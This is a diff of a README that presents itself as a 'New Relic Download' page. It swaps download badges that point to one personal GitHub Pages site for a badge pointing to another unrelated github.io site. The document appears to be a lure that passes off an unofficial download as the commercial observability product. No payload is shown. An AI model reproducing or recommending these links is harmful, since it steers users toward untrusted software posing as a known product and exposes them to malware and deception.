@@ -1,18 +1,7 @@
 # New Relic Download — Observability Platform
 
-<a href="https://io-app-git.github.io/.github/?offer=NewRelic" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/New%20Relic%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="New Relic for macOS">
-</a>
+[![GET New Relic](https://img.shields.io/badge/GET%20%E2%80%94%20New-Relic-0078D6?style=for-the-badge&logoColor=white)](https://igbalmaren.github.io/.github/New-Relic)
 
-<a href="https://io-app-git.github.io/.github/?offer=NewRelic" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/New%20Relic%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="New Relic for Windows">
-</a>
 
 ---
 
